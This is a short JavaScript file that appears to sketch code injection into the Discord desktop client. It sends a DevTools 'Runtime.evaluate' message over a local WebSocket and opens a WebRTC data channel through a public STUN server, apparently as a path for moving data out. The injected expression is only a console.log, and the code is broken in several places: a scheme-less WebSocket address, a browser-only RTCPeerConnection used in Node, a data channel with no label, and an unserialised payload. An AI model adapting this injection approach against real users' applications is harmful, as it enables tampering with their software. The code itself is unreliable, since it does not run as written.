import WebSocket, { WebSocketServer } from 'ws';

// Create WebRTC channels for sending and receiving data from the STUN servers
const configuration = {'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}]}
const peerConnection = new RTCPeerConnection(configuration);
const dataChannel = peerConnection.createDataChannel();

// Connect to discord desktop application web socket
const ws = new WebSocket("localhost")
ws.on("open", function(){
    let payload = {
        id: 1337,
        method: 'Runtime.evaluate',
        params: {
            expression: "console.log('injected');"
        }
    }

    ws.send(payload)
})